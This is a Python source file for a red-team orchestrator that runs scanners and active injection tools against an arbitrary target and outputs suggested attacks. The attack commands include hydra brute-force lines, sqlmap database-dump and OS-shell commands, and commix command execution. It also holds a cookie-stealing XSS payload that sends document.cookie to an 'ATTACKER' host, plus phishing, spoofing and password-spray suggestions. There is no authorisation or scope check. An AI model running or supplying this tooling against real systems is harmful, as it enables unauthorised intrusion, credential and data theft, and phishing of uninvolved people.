#!/usr/bin/env python3
"""
Red Team Scan Orchestrator
Runs all available tools against a target, produces a vulnerability report,
and suggests attack options based on findings.
"""

import json
import os
import re
import shutil
import socket
import ssl
import subprocess
import threading
import time
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

TOOLS_DIR = os.environ.get("TOOLS_DIR", "/opt/hackingtool-arsenal")

# ══════════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════════

def _finding(severity, title, detail, evidence="", module=""):
    return {"severity": severity, "title": title, "detail": detail,
            "evidence": evidence, "module": module}

def _attack(name, desc, command, risk, category):
    return {"name": name, "description": desc, "command": command,
            "risk": risk, "category": category}

def _tool(name):
    return shutil.which(name) is not None

def _tpath(subdir):
    p = os.path.join(TOOLS_DIR, subdir)
    return p if os.path.isdir(p) else None

def _run(cmd, timeout=180):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True,
                              text=True, timeout=timeout)
        return proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except Exception as e:
        return "", str(e), -1

def _domain(target):
    if "://" in target:
        return urllib.parse.urlparse(target).hostname or target
    return target.split("/")[0].split(":")[0]

def _url(target):
    if not target.startswith(("http://", "https://")):
        return f"http://{target}"
    return target

def detect_type(target):
    target = target.strip()
    if re.match(r'^[\w.+-]+@[\w.-]+\.\w+$', target):
        return "email"
    if re.match(r'^\+?\d[\d\s\-()]{6,}$', target):
        return "phone"
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target):
        return "ip"
    if "://" in target or "." in target:
        return "domain"
    return "username"

# ══════════════════════════════════════════════════════════════════════════════
# Scan Modules — each returns {raw_output, findings[], attacks[]}
# ══════════════════════════════════════════════════════════════════════════════

def mod_dns(target, tt):
    domain = _domain(target)
    F, A, out = [], [], []
    try:
        ips = set(a[4][0] for a in socket.getaddrinfo(domain, None))
        out.append(f"Resolved: {', '.join(ips)}")
        for ip in ips:
            F.append(_finding("info", f"IP: {ip}", f"{domain} → {ip}", module="DNS"))
    except socket.gaierror:
        F.append(_finding("high", "DNS resolution failed", f"Cannot resolve {domain}", module="DNS"))
        return {"raw_output": f"Cannot resolve {domain}", "findings": F, "attacks": A}

    if _tool("dig"):
        for rt in ("A","AAAA","MX","NS","TXT","CNAME"):
            s,_,_ = _run(f"dig +short {domain} {rt}", 10)
            if s.strip():
                out.append(f"{rt}: {s.strip()}")
                if rt == "TXT":
                    for ln in s.strip().split("\n"):
                        if "v=spf1" in ln and "~all" in ln:
                            F.append(_finding("medium", "Weak SPF (softfail)", "~all allows spoofing", evidence=ln, module="DNS"))
                            A.append(_attack("Email Spoofing", "SPF softfail allows forged emails", f"Use SET/GoPhish to spoof @{domain}", "medium", "social_engineering"))
        s,_,_ = _run(f"dig +short _dmarc.{domain} TXT", 10)
        if s.strip():
            F.append(_finding("info", "DMARC record found", s.strip(), module="DNS"))
            if "p=none" in s:
                F.append(_finding("medium", "DMARC policy=none", "Not enforcing email auth", module="DNS"))
        else:
            F.append(_finding("medium", "No DMARC record", "Email spoofing possible", module="DNS"))
            A.append(_attack("Email Spoofing (no DMARC)", "No DMARC policy", f"Spoof emails from @{domain}", "medium", "social_engineering"))

    if _tool("whois"):
        s,_,_ = _run(f"whois {domain}", 15)
        if s.strip():
            out.append(f"\n--- WHOIS ---\n{s[:1500]}")
            for ln in s.split("\n"):
                ll = ln.lower()
                if "registrar:" in ll:
                    F.append(_finding("info", "Registrar", ln.strip(), module="DNS"))
                if "creation" in ll and "date" in ll:
                    F.append(_finding("info", "Created", ln.strip(), module="DNS"))

    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_headers(target, tt):
    if not requests:
        return {"raw_output": "requests unavailable", "findings": [], "attacks": []}
    url = _url(target)
    F, A, out = [], [], []
    try:
        r = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        h = r.headers
        out.append(f"HTTP {r.status_code} {r.url}")
        for k,v in h.items():
            out.append(f"  {k}: {v}")

        srv = h.get("Server","")
        if srv:
            F.append(_finding("info", f"Server: {srv}", "Server header disclosed", module="Headers"))
            if any(old in srv.lower() for old in ["apache/2.2","apache/2.0","nginx/1.0","iis/6","iis/7"]):
                F.append(_finding("high", f"Outdated server: {srv}", "Known vulnerabilities likely", module="Headers"))
                A.append(_attack("Exploit old server", f"{srv} has known CVEs", f"searchsploit {srv.split('/')[0]}", "high", "exploitation"))

        xpb = h.get("X-Powered-By","")
        if xpb:
            F.append(_finding("low", f"X-Powered-By: {xpb}", "Tech stack disclosed", module="Headers"))

        missing = {
            "X-Frame-Options": ("medium", "Missing X-Frame-Options → clickjacking"),
            "Strict-Transport-Security": ("medium", "Missing HSTS → downgrade attacks"),
            "Content-Security-Policy": ("medium", "Missing CSP → XSS impact wider"),
            "X-Content-Type-Options": ("low", "Missing X-Content-Type-Options"),
            "X-XSS-Protection": ("low", "Missing X-XSS-Protection"),
        }
        for hdr,(sev,detail) in missing.items():
            if hdr not in h:
                F.append(_finding(sev, f"Missing {hdr}", detail, module="Headers"))

        if "X-Frame-Options" not in h and "Content-Security-Policy" not in h:
            A.append(_attack("Clickjacking", "No frame protection", f'<iframe src="{url}" width="100%" height="100%"></iframe>', "medium", "client_side"))
        if "Strict-Transport-Security" not in h:
            A.append(_attack("SSL Stripping", "No HSTS", "sslstrip / bettercap MITM", "medium", "network"))

        sc = h.get("Set-Cookie","")
        if sc:
            if "httponly" not in sc.lower():
                F.append(_finding("medium", "Cookie missing HttpOnly", "JS can read session cookies", module="Headers"))
                A.append(_attack("Cookie theft via XSS", "HttpOnly missing", "<script>fetch('http://ATTACKER/'+document.cookie)</script>", "high", "client_side"))
            if "secure" not in sc.lower():
                F.append(_finding("medium", "Cookie missing Secure flag", "Sent over HTTP", module="Headers"))

        body = r.text[:5000]
        cms = {"WordPress":["/wp-content/","/wp-includes/"], "Drupal":["Drupal.settings"],
               "Joomla":["/components/com_"], "Laravel":["laravel_session"]}
        for name, pats in cms.items():
            if any(p in body for p in pats):
                F.append(_finding("info", f"CMS: {name}", f"Detected in response", module="Headers"))
                if name == "WordPress":
                    A.append(_attack(f"WPScan", "Enumerate WordPress vulns", f"wpscan --url {url}", "medium", "exploitation"))
                break

    except requests.exceptions.SSLError:
        F.append(_finding("medium", "SSL error", "Self-signed or expired cert", module="Headers"))
    except requests.exceptions.ConnectionError:
        F.append(_finding("high", "Connection refused", f"Cannot connect to {url}", module="Headers"))
    except Exception as e:
        out.append(f"Error: {e}")
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_ssl(target, tt):
    domain = _domain(target)
    F, A, out = [], [], []
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10)
            s.connect((domain, 443))
            cert = s.getpeercert()
            subj = dict(x[0] for x in cert.get('subject',[]))
            iss = dict(x[0] for x in cert.get('issuer',[]))
            out.append(f"Subject: {subj.get('commonName','?')}")
            out.append(f"Issuer: {iss.get('organizationName','?')}")
            out.append(f"Expires: {cert.get('notAfter','?')}")
            F.append(_finding("info", f"SSL issuer: {iss.get('organizationName','?')}", "", module="SSL"))
            na = cert.get('notAfter','')
            if na:
                try:
                    exp = datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                    days = (exp - datetime.utcnow()).days
                    out.append(f"Days left: {days}")
                    if days < 0:
                        F.append(_finding("critical", "SSL cert EXPIRED", f"Expired {abs(days)}d ago", module="SSL"))
                    elif days < 30:
                        F.append(_finding("medium", "SSL cert expiring soon", f"{days}d left", module="SSL"))
                except Exception:
                    pass
            sans = [x[1] for x in cert.get('subjectAltName',[])]
            if sans:
                out.append(f"SANs: {', '.join(sans[:10])}")
    except ssl.SSLError as e:
        F.append(_finding("high", "SSL error", str(e), module="SSL"))
    except (socket.timeout, ConnectionRefusedError):
        F.append(_finding("info", "Port 443 closed/timeout", "", module="SSL"))
    except Exception as e:
        out.append(f"Error: {e}")

    if _tool("sslscan"):
        s,_,_ = _run(f"sslscan --no-colour {domain}", 30)
        if s:
            out.append(f"\n{s[:2000]}")
            if "SSLv3" in s or "SSLv2" in s:
                F.append(_finding("high", "Deprecated SSL protocol", "SSLv2/v3 enabled", module="SSL"))
                A.append(_attack("POODLE", "SSLv3 padding oracle", "Use poodle-exploit tool", "high", "network"))
            for w in ["RC4","DES","NULL","EXPORT"]:
                if w in s:
                    F.append(_finding("high", f"Weak cipher: {w}", "", module="SSL"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_robots(target, tt):
    if not requests:
        return {"raw_output": "", "findings": [], "attacks": []}
    url = _url(target)
    F, A, out = [], [], []
    try:
        r = requests.get(f"{url}/robots.txt", timeout=10, verify=False)
        if r.status_code == 200 and "Disallow" in r.text:
            out.append(f"--- robots.txt ---\n{r.text[:1500]}")
            F.append(_finding("info", "robots.txt found", "", module="Recon"))
            for ln in r.text.split("\n"):
                if ln.strip().startswith("Disallow:"):
                    path = ln.split(":",1)[1].strip()
                    if path and path != "/":
                        if any(p in path.lower() for p in ["/admin","/api","/private","/secret","/backup","/internal","/.git","/.env"]):
                            F.append(_finding("medium", f"Interesting path: {path}", "Hidden from crawlers", module="Recon"))
                            A.append(_attack(f"Access {path}", "May contain sensitive data", f"curl -s {url}{path}", "medium", "recon"))
    except Exception:
        pass
    try:
        r = requests.get(f"{url}/sitemap.xml", timeout=10, verify=False)
        if r.status_code == 200 and "<url" in r.text.lower():
            cnt = r.text.lower().count("<url")
            F.append(_finding("info", f"Sitemap found ({cnt} URLs)", "", module="Recon"))
    except Exception:
        pass
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_tech(target, tt):
    url = _url(target)
    F, A, out = [], [], []
    if _tool("whatweb"):
        s,_,_ = _run(f"whatweb -a 3 --color=never {url}", 30)
        if s:
            out.append(s)
            for tech in re.findall(r'\[([^\]]+)\]', s):
                if tech and not tech.isdigit() and len(tech) > 1:
                    F.append(_finding("info", f"Tech: {tech}", "", module="Tech"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_ports_basic(target, tt):
    """Fallback port scan when nmap unavailable."""
    if _tool("nmap"):
        return {"raw_output": "nmap available, skipping basic scan", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A, out = [], [], [f"Basic port scan: {host}"]
    ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
             110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
             1433:"MSSQL",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",
             5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
    for port, svc in ports.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((host, port)) == 0:
                out.append(f"  {port}/tcp open {svc}")
                F.append(_finding("info", f"Open port {port}/{svc}", "", module="PortScan"))
            s.close()
        except Exception:
            pass
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_nmap(target, tt):
    if not _tool("nmap"):
        return {"raw_output": "nmap not installed", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A = [], []
    s,e,rc = _run(f"nmap -sV -sC --top-ports 1000 -T4 --open {host}", 300)
    out = s + e
    if rc != 0 and not s:
        return {"raw_output": f"nmap error: {out[:500]}", "findings": [], "attacks": []}

    for port_s, svc, ver in re.findall(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', s):
        port = int(port_s)
        ver = ver.strip()
        F.append(_finding("info", f"Port {port}/{svc}", ver or svc, evidence=f"{port}/tcp open {svc} {ver}", module="NMAP"))

        if port == 21 or svc == "ftp":
            F.append(_finding("medium", "FTP exposed", "", module="NMAP"))
            A.append(_attack("FTP anonymous login", "Check anonymous access", f"ftp {host} # try anonymous/anonymous", "medium", "access"))
            A.append(_attack("FTP brute force", "", f"hydra -L users.txt -P pass.txt ftp://{host}", "medium", "brute_force"))
        if port == 22 or svc == "ssh":
            A.append(_attack("SSH brute force", "", f"hydra -L users.txt -P pass.txt ssh://{host}", "medium", "brute_force"))
            m = re.search(r'OpenSSH[_ ](\d+\.\d+)', ver)
            if m and float(m.group(1)) < 8.0:
                F.append(_finding("high", f"Outdated OpenSSH {m.group(1)}", "", module="NMAP"))
                A.append(_attack("Exploit old SSH", "", f"searchsploit openssh {m.group(1)}", "high", "exploitation"))
        if port == 23:
            F.append(_finding("high", "Telnet exposed", "Plaintext protocol", module="NMAP"))
        if port in (80,443,8080,8443) or "http" in svc:
            A.append(_attack(f"Web scan port {port}", "", f"nikto -h {host}:{port}", "medium", "recon"))
        if port == 3306 or svc == "mysql":
            F.append(_finding("high", "MySQL exposed", "", module="NMAP"))
            A.append(_attack("MySQL brute force", "", f"hydra -L users.txt -P pass.txt mysql://{host}", "high", "brute_force"))
        if port == 5432 or svc == "postgresql":
            F.append(_finding("high", "PostgreSQL exposed", "", module="NMAP"))
            A.append(_attack("PostgreSQL brute force", "", f"hydra -L users.txt -P pass.txt postgres://{host}", "high", "brute_force"))
        if port == 3389:
            F.append(_finding("medium", "RDP exposed", "", module="NMAP"))
            A.append(_attack("BlueKeep check", "CVE-2019-0708", f"nmap --script rdp-vuln-ms12-020 -p 3389 {host}", "critical", "exploitation"))
        if port == 445 or svc == "microsoft-ds":
            F.append(_finding("high", "SMB exposed", "", module="NMAP"))
            A.append(_attack("EternalBlue check", "MS17-010", f"nmap --script smb-vuln-ms17-010 -p 445 {host}", "critical", "exploitation"))
            A.append(_attack("SMB enum shares", "", f"smbclient -L //{host}/ -N", "medium", "recon"))
        if port == 6379:
            F.append(_finding("critical", "Redis exposed", "Often no auth", module="NMAP"))
            A.append(_attack("Redis unauth access", "", f"redis-cli -h {host}", "critical", "access"))
        if port == 27017:
            F.append(_finding("critical", "MongoDB exposed", "Often no auth", module="NMAP"))
            A.append(_attack("MongoDB unauth access", "", f"mongosh --host {host}", "critical", "access"))

    for cve in set(re.findall(r'(CVE-\d{4}-\d+)', s)):
        F.append(_finding("critical", f"CVE: {cve}", "Detected by NMAP scripts", module="NMAP"))
        A.append(_attack(f"Exploit {cve}", "", f"searchsploit {cve}", "critical", "exploitation"))

    return {"raw_output": s[:5000], "findings": F, "attacks": A}


def mod_nikto(target, tt):
    if not _tool("nikto"):
        return {"raw_output": "nikto not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,e,_ = _run(f"nikto -h {url} -maxtime 180 -nointeractive -C all", 240)
    out = s + e
    for ln in out.split("\n"):
        ln = ln.strip()
        if not ln.startswith("+"):
            continue
        clean = ln.lstrip("+ ")
        if any(k in clean.lower() for k in ["vulnerab","injection","xss","traversal","remote code","rce"]):
            F.append(_finding("high", f"Nikto: {clean[:100]}", clean, module="Nikto"))
        elif any(k in clean.lower() for k in ["interesting","unusual","outdated","OSVDB","directory","listing"]):
            F.append(_finding("medium", f"Nikto: {clean[:100]}", clean, module="Nikto"))
            if "listing" in clean.lower() or "directory" in clean.lower():
                A.append(_attack("Browse exposed dirs", "Directory listing enabled", f"Browse {url}", "medium", "recon"))
    return {"raw_output": out[:5000], "findings": F, "attacks": A}


def mod_dirb(target, tt):
    if not _tool("dirb"):
        return {"raw_output": "dirb not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,_,_ = _run(f"dirb {url} -r -z 100 -S 2>&1 | head -120", 180)
    for found_url, code_s in re.findall(r'\+ (https?://\S+) \(CODE:(\d+)', s):
        code = int(code_s)
        path = urllib.parse.urlparse(found_url).path
        if code == 200:
            F.append(_finding("info", f"Dir: {path}", f"{found_url}", module="Dirb"))
            if any(p in path.lower() for p in ["/admin","/manager","/phpmyadmin","/wp-admin","/cpanel","/dashboard"]):
                F.append(_finding("high", f"Admin panel: {path}", "", module="Dirb"))
                A.append(_attack("Admin brute force", f"Panel at {path}", f"hydra -L users.txt -P pass.txt {_domain(target)} http-post-form '{path}:user=^USER^&pass=^PASS^:invalid'", "high", "brute_force"))
            if any(p in path.lower() for p in ["/backup","/.git","/.env","/config","/.svn"]):
                F.append(_finding("critical", f"Sensitive path: {path}", "", module="Dirb"))
                A.append(_attack(f"Access {path}", "Sensitive data", f"curl -s {found_url}", "critical", "info_disclosure"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_sublist3r(target, tt):
    sp = _tpath("Sublist3r")
    if not sp and not _tool("sublist3r"):
        return {"raw_output": "sublist3r not installed", "findings": [], "attacks": [], "skipped": True}
    domain = _domain(target)
    F, A = [], []
    cmd = f"cd {sp} && python3 sublist3r.py -d {domain} -t 10" if sp else f"sublist3r -d {domain} -t 10"
    s,e,_ = _run(cmd, 120)
    out = s + e
    subs = set()
    for ln in out.split("\n"):
        m = re.search(r'([a-zA-Z0-9][\w.-]*\.' + re.escape(domain) + r')', ln)
        if m:
            subs.add(m.group(1))
    for sub in sorted(subs):
        F.append(_finding("info", f"Subdomain: {sub}", "", module="Sublist3r"))
    if subs:
        A.append(_attack("Subdomain takeover check", f"{len(subs)} subdomains found", "Check CNAME records for dangling references", "medium", "recon"))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_sqlmap(target, tt):
    if not _tool("sqlmap"):
        return {"raw_output": "sqlmap not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,e,_ = _run(f"sqlmap -u {url} --crawl=2 --batch --smart --risk=1 --level=1 --threads=4 --timeout=10 --retries=1 2>&1 | tail -60", 180)
    out = s
    if "is vulnerable" in out.lower() or "injectable" in out.lower():
        F.append(_finding("critical", "SQL Injection found", "SQLMap confirmed SQLi", evidence=out[-500:], module="SQLMap"))
        pm = re.search(r"Parameter: (\S+)", out)
        param = pm.group(1) if pm else "?"
        A.append(_attack("SQLi dump database", f"Param: {param}", f"sqlmap -u '{url}' --dump --batch", "critical", "injection"))
        A.append(_attack("SQLi OS shell", f"Param: {param}", f"sqlmap -u '{url}' --os-shell --batch", "critical", "injection"))
    else:
        F.append(_finding("info", "SQLMap: no injection found", "Initial crawl clean", module="SQLMap"))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_xsstrike(target, tt):
    sp = _tpath("XSStrike")
    if not sp:
        return {"raw_output": "XSStrike not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,_,_ = _run(f"cd {sp} && python3 xsstrike.py -u {url} --crawl -t 10 --skip 2>&1 | head -80", 120)
    if "vulnerable" in s.lower() or "reflection" in s.lower():
        F.append(_finding("high", "XSS vulnerability", "XSStrike found reflection/vuln", evidence=s[-500:], module="XSStrike"))
        A.append(_attack("XSS exploitation", "XSS confirmed", f"cd {sp} && python3 xsstrike.py -u {url} --crawl", "high", "injection"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_sherlock(target, tt):
    sp = _tpath("sherlock")
    if not sp and not _tool("sherlock"):
        return {"raw_output": "sherlock not installed", "findings": [], "attacks": [], "skipped": True}
    F, A = [], []
    cmd = f"cd {sp} && python3 sherlock {target} --timeout 10 2>&1 | head -60" if sp else f"sherlock {target} --timeout 10 2>&1 | head -60"
    s,_,_ = _run(cmd, 120)
    found = [ln.strip() for ln in s.split("\n") if "http" in ln]
    for acct in found:
        F.append(_finding("info", f"Account: {acct[:80]}", acct, module="Sherlock"))
    if found:
        A.append(_attack("Social engineering recon", f"{len(found)} accounts found", "Use profiles for social engineering", "medium", "social_engineering"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_email(target, tt):
    F, A, out = [], [], []
    domain = target.split("@")[1] if "@" in target else target
    if _tool("dig"):
        s,_,_ = _run(f"dig +short {domain} MX", 10)
        if s.strip():
            out.append(f"MX: {s.strip()}")
            F.append(_finding("info", "Mail servers found", s.strip(), module="Email"))
    F.append(_finding("info", f"Email domain: {domain}", "", module="Email"))

    infoga = _tpath("Infoga")
    if infoga:
        s,_,_ = _run(f"cd {infoga} && python3 infoga.py --domain {domain} --source all 2>&1 | head -40", 60)
        if s:
            out.append(f"\n--- Infoga ---\n{s}")

    for cmd_name in ("theHarvester","theharvester"):
        if _tool(cmd_name):
            s,_,_ = _run(f"{cmd_name} -d {domain} -l 100 -b all 2>&1 | tail -30", 120)
            if s:
                out.append(f"\n--- theHarvester ---\n{s}")
                for e in set(re.findall(r'[\w.+-]+@[\w.-]+\.\w+', s)):
                    F.append(_finding("info", f"Related email: {e}", "", module="Email"))
            break

    A.append(_attack("Phishing campaign", f"Target: {target}", f"Use GoPhish/SET to phish {target}", "medium", "social_engineering"))
    A.append(_attack("Password spray", f"Target: {target}", "Try common passwords on O365/Gmail/etc", "medium", "brute_force"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_commix(target, tt):
    if not _tool("commix"):
        cp = _tpath("commix")
        if not cp:
            return {"raw_output": "commix not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    cp = _tpath("commix")
    cmd = f"cd {cp} && python3 commix.py -u {url} --crawl=1 --batch 2>&1 | tail -30" if cp else f"commix -u {url} --crawl=1 --batch 2>&1 | tail -30"
    s,_,_ = _run(cmd, 120)
    if "injectable" in s.lower() or "vulnerable" in s.lower():
        F.append(_finding("critical", "Command injection found", "Commix confirmed OS command injection", evidence=s[-500:], module="Commix"))
        A.append(_attack("Command injection → shell", "OS command injection", f"commix -u '{url}' --os-cmd='id'", "critical", "injection"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


# ══════════════════════════════════════════════════════════════════════════════
# Module Registry
# ══════════════════════════════════════════════════════════════════════════════

MODULES = [
    {"id":"dns",        "name":"DNS & WHOIS Recon",        "fn":mod_dns,        "types":["domain","url"],             "phase":"recon"},
    {"id":"headers",    "name":"HTTP Security Headers",    "fn":mod_headers,    "types":["domain","url"],             "phase":"recon"},
    {"id":"ssl",        "name":"SSL/TLS Analysis",         "fn":mod_ssl,        "types":["domain","url"],             "phase":"recon"},
    {"id":"robots",     "name":"Robots & Sitemap",         "fn":mod_robots,     "types":["domain","url"],             "phase":"recon"},
    {"id":"tech",       "name":"Technology Detection",     "fn":mod_tech,       "types":["domain","url"],             "phase":"recon"},
    {"id":"ports",      "name":"Basic Port Scan",          "fn":mod_ports_basic,"types":["domain","url","ip"],        "phase":"recon"},
    {"id":"nmap",       "name":"NMAP Service Scan",        "fn":mod_nmap,       "types":["domain","url","ip"],        "phase":"scanning"},
    {"id":"nikto",      "name":"Nikto Web Scanner",        "fn":mod_nikto,      "types":["domain","url"],             "phase":"scanning"},
    {"id":"sublist3r",  "name":"Subdomain Enumeration",    "fn":mod_sublist3r,  "types":["domain","url"],             "phase":"scanning"},
    {"id":"dirb",       "name":"Directory Brute Force",    "fn":mod_dirb,       "types":["domain","url"],             "phase":"scanning"},
    {"id":"sqlmap",     "name":"SQL Injection Scan",       "fn":mod_sqlmap,     "types":["domain","url"],             "phase":"exploitation"},
    {"id":"xsstrike",   "name":"XSS Scanner",              "fn":mod_xsstrike,   "types":["domain","url"],             "phase":"exploitation"},
    {"id":"commix",     "name":"Command Injection Scan",   "fn":mod_commix,     "types":["domain","url"],             "phase":"exploitation"},
    {"id":"sherlock",   "name":"Username OSINT",           "fn":mod_sherlock,   "types":["username"],                 "phase":"recon"},
    {"id":"email",      "name":"Email OSINT",              "fn":mod_email,      "types":["email"],                    "phase":"recon"},
]

# ══════════════════════════════════════════════════════════════════════════════
# Orchestrator
# ══════════════════════════════════════════════════════════════════════════════

_scans = {}

def start_scan(target, target_type=None):
    target = target.strip()
    if not target_type:
        target_type = detect_type(target)
    scan_id = uuid.uuid4().hex[:8]
    applicable = [m for m in MODULES if target_type in m["types"]]

    scan = {
        "id": scan_id,
        "target": target,
        "target_type": target_type,
        "status": "running",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "completed_at": None,
        "modules": {},
        "findings": [],
        "attacks": [],
        "summary": {"critical":0,"high":0,"medium":0,"low":0,"info":0},
        "progress": {"total": len(applicable), "completed": 0, "current": "Starting..."},
    }
    for m in applicable:
        scan["modules"][m["id"]] = {
            "name": m["name"], "phase": m["phase"],
            "status": "pending", "raw_output": "", "findings_count": 0,
        }
    _scans[scan_id] = scan
    threading.Thread(target=_execute, args=(scan_id, target, target_type, applicable), daemon=True).start()
    return scan_id


def _execute(scan_id, target, target_type, modules):
    scan = _scans[scan_id]
    for phase in ("recon", "scanning", "exploitation"):
        phase_mods = [m for m in modules if m["phase"] == phase]
        if not phase_mods:
            continue
        with ThreadPoolExecutor(max_workers=4) as pool:
            futs = {}
            for m in phase_mods:
                scan["modules"][m["id"]]["status"] = "running"
                scan["progress"]["current"] = m["name"]
                futs[pool.submit(m["fn"], target, target_type)] = m
            for fut in as_completed(futs):
                m = futs[fut]
                try:
                    res = fut.result()
                    if res.get("skipped"):
                        scan["modules"][m["id"]]["status"] = "skipped"
                        scan["modules"][m["id"]]["raw_output"] = res.get("raw_output","")
                    else:
                        scan["modules"][m["id"]]["status"] = "completed"
                        scan["modules"][m["id"]]["raw_output"] = res.get("raw_output","")
                        mf = res.get("findings",[])
                        scan["modules"][m["id"]]["findings_count"] = len(mf)
                        scan["findings"].extend(mf)
                        scan["attacks"].extend(res.get("attacks",[]))
                except Exception as e:
                    scan["modules"][m["id"]]["status"] = "error"
                    scan["modules"][m["id"]]["raw_output"] = str(e)
                scan["progress"]["completed"] += 1

    # Summarize
    for f in scan["findings"]:
        sev = f.get("severity","info")
        if sev in scan["summary"]:
            scan["summary"][sev] += 1

    # Dedupe attacks
    seen = set()
    uniq = []
    for a in scan["attacks"]:
        if a["name"] not in seen:
            seen.add(a["name"])
            uniq.append(a)
    risk_ord = {"critical":0,"high":1,"medium":2,"low":3}
    uniq.sort(key=lambda a: risk_ord.get(a.get("risk","low"),4))
    scan["attacks"] = uniq

    scan["status"] = "completed"
    scan["completed_at"] = datetime.now(timezone.utc).isoformat()
    scan["progress"]["current"] = "Done"


def get_scan(scan_id):
    return _scans.get(scan_id)

def list_scans():
    return [{"id":s["id"],"target":s["target"],"target_type":s["target_type"],
             "status":s["status"],"started_at":s["started_at"],
             "summary":s["summary"]} for s in _scans.values()]
